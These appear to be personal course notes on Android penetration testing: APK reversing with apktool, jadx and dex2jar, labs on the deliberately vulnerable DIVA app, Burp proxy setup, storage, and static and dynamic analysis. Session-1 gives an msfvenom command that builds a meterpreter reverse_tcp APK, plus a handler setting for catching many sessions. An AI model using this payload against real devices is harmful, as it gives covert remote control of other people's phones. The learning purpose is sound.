# android-pentesting

## Session-1
**msfvenom** - a metasploit standalone paypload generator
msf> use payload/android/ - click on tab to see all payload for android system

two types of payloads: 
1. **Staged:** when payload executed, the malicious code will be downloaded on the device (payload without malicious code). Each time you enter the session to target, the payload will be downloaded again on the target. payload is executed on the momery only. good to not be detected [meterpreter/reverse_tcp]
2. **Non-Staged:** payload with the malicious code [meterpreter_reverse_tcp]

to create android payload:
```
msf> use payload/android/meterpreter/reverse_tcp
msf> options
msf> advanced - to show all advanced options
kali# msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f raw -o app.apk
```
**Note**: In the msfvenom executable extensions there is no apk, so use raw instead, for format.
Note: In the multi/handler there is an option that allow you to recieve many sessions using the same payload `msf(multi/handler)> set exitonsession false`. By default the listener will be close after recieving the first session.


## Session-2
Intro to the topics, that we will learn
See the intro-topics.pdf file for details 

## Session-3
Building the testing Enviroments
See the building-enviroment.pdf file for details

## Session-4
**Reversing the APK**: (Testing-App: deva from github)
Firstly, you use the app normally, then reverse the code to understand it better.

To extract the .apk file, unzip the .apk normally(unpacking not decompiling), you get: 
- Manifest.xml is not readable  
- .dex files can be found  (to read .dex files used **d2j-dex2jar** or **jadx**)   
- certs + signature-files are available

so to extract the apk file, we use apktool.
-> **apktool**: to extract and decode the apk files 
`apktool d myapp.apk` - decompiles .dex files to .smali
`apktool d myapp.apk -s` -s is to not decompile the .dex files. Here you will not get the smali code, you will get the classes.dex. It contains the apk-code decoded in binary. you can view it with "binary viewer" programm 
We have now: 
- **res file**, which contains the pictures, videos media and the colors of the app.
- **androidManifest.xml** which contains allowed/denied permissions and other infos about the app
- **classes.dex** which contains the java code of the application encoded.

-> **Dex2Jar**: to compile the classes.dex to a java-code (.jar)
`d2j-dex2jar classes.dex`
We have Now:
- the java code from the classes.dex in .jar format

->**JD-Gui**: to view the .jar file (similar tools: procyon and Fernflower)
open the jd-gui and import the .jar file
- under the com.example.androind.camera2basic will you find a lot of useful informations. The R.class is important.
**R.class** has names and reference numbers. so if you find a number is the code generall, you can search it in the R.class.

-> **jadx**: a good tool will automate the work above, just import the apk file and the java-code will be displayed.
`jadx -d myapp.apk`
`jadx -d myapp.dex`

-> **adb tool**:
`adb devices`
`adb install myapp.apk` - you may get a problem while installing because the certification of the app is unkown!

-> **Smali & backsmali**: are programs referred as an assembler and disassembler.
`apktool d myapp.apk` without -s will you get the smali files
-> **baksmali**: 
`apktool d myapp.apk -s` with -s will you not get the smali files
`baksmali disassemble classes.dex`

-> **obfuscation**:
A tools used by developers while compiling the app to change class/methods/variables names to meaningless names, so if someone try to decompile the app, the class/methods/variables names are meaningless to make the app-code hard to read.
Also methods/classes/variables can be moved to another files.

-> **OEM apps**: 


Starting the pratical with the diva app from github:
1. install dive on the android simulator
`adb install diva.apk`
2. browser the dive app normal
3. open jadx-gui and import the apk file in it 

-> **Lab - locating secrets**:
How to test? : firstly understand the app function, search for terms in the jadx until you find the method of the app function, try to understand the method, numbers refers to specifc names and can be understood in the R.class (name = number), get the name and search for it in the strings file, you may find some sensitive information or login credentials.

-> **Lab - insecure logging**:
How to test? : enter any data, app will show an error, search for that error in the jadx, read the code to understand how entered data is processed, catch the logs to see if sensitive data are saved in the logs or data are savd unecrypted.
to catch logs from the android app:
`adb logcat > logs.txt`
logs are saved insecure or sensitive data are saved in the logs!!

-> **Lab - hardcoding issues**
to find information in the code that allows you to access data or login credentials
How to test? : enter any data, app will show an error, search for that error in the jadx, read the code to understand how entered data is processed, bypass it :)

## Session-5
Android Rooting - Explained in the Slides.

## Session-6
Android Fundementals - Slides
Programming Basic is required!

- minSdkVersion: Specifies earliest version of android the app run on
- targetSDKVersion: Android version that has the app been tested on.
- maxSdkVersion: not recommended to be set to a value

<intent-filter/> - to set things that can be called from other intent or applications. Very dangerous!


## Session-7 - Burpsuite
Install burpsuite. configure on the mobile phone the burpsuite proxy configurations, so that burpsuite can intercept any out/ingoing requests.
1. install burpsuite, then go to proxy -> options -> add -> all interfaces
2. open your phone, go to wifi setting, enable proxy (set burpsuite ip & listening port)
3. open browser, download burpsutie-certification from `http://burp`
4. open file manager and go to download, then change the downloaded certificate extension from **.der** to **.cer**
5. go phone setting, search for certificates, open trusted certificates, locate and install the certificate. (Note: we install the certificate to allow intercepting https traffics)

to understand how the app deal with certificates, extract the app with apktool and open the classes.dex with jadx. Search for any related word for certificates like (ALLOW_ALL, certificate, Validation, SSL, Authorization) to reverse the methods/classes used to validates certificates. 
 

## Session-8 - Storage:
- Android files System is similar to linux System.
[image-android-file-system]
- **by default**, apps are install on the internal storage.
- **Normal Apps** can be found under /data/app directory 
- **System Apps** are under /system/app or /system/priv-app. readonly, to have more permissions, you have to root the device.
- **App files** are only accessible by the app itself through the UID, so if there is 2 apps that has the same UID, both can access each other directories.
- Options to set the context of a file in an app:
	- **MODE_PRIVATE**: default mode, files accessible only by the app itself or any app with the same UID.
	- **MODE_WORLD_READABLE**: All apps has only read access to app files
	- **MODE_WORLD_WRITEABLE**: All apps has only write access to app files
	- **MODE_APPEND**: If files exists, write/append data to it. 
- **External Storage** can be found under /sdcard or /mnt/sdcard
- Apps need **WRITE_EXTERNAL_STORAGE** to access the external storage.
- **Device Administration API**: It is an android management api to set policy to allow/deny/apply things on the target device.
[image Device Administration API]
- **MDM Solution** Performs functions like enforcing password policies, forcing encryption on storage, enabling remote wiping, root detection (some apps like bank-apps can't be installed on rooted device), etc.. (ex: Maas360, AirWatch, MoibleIron)
- **SDK**: are classes or .jar files for developers to interface with code written by third-parties.

--> **Lab - Insecure External Storage:**
- cmd> adb install myapp.apk
- cmd> adb shell - to get a shell session on the device
[Youtube-Video]

--> **Lab-1 - UnsecureDataStorage**: Data is unecrypted stored on device. To check: search for methods/classes that do the process of saving data on device, understand it to locate where data are saved on device. Access device with adb `adb shell`, then go to app folder `/data/data/*$appname*/`. Data can by save in **database app folder**, **share_prefs app folder**, **external storage**
  - to download file from device `adb pull $path_to_get $path_to_save` 

## Session-9 - Static Analysis:
Firstly, open the .apk file in jadx and most importantly, you need a basic of programming.
- Search in `/res/value/strings` - you may find databases links and other values, search for specific words like (password, user, ftp, http, api, sql etc..)
- Search in `/Resources/AndroidManifest.xml`, you may find something juicy. 
- Use the search function in jadx to search also for specific words like (password, user, ftp, http, api, sql etc..) - github dorks will help here!
- try to understand how app process api, database, requests and other.
- While using the app, if you get any error, search for that error by jadx, to understand how that error prompt, you may bypass it to something sensitive.
- In the `AndroidManifest.xml`, search for `exported="true"`. You will get the exported activites. to call them, use the adb
  `adb shell`
  `am start $AppName/.activity_name`
  you may find something juicy!
- `R.string.$AnyName`, search for that $AnyName in `/res/value/strings`

## Session-10 - Dynamic Analysis:
Analysis during the app runtime.
- run burpsuite in the background and use the app normal, then see the sent requests
- To bypass the ssl-pinning use frida android
- Objection tool from github is a powerful tool

# AUTOMATED STATIC ANALYSIS
- MobSF (recommended) - Very Powerful
- quark (recommended)
- AndroBugs  
- JAADAS

















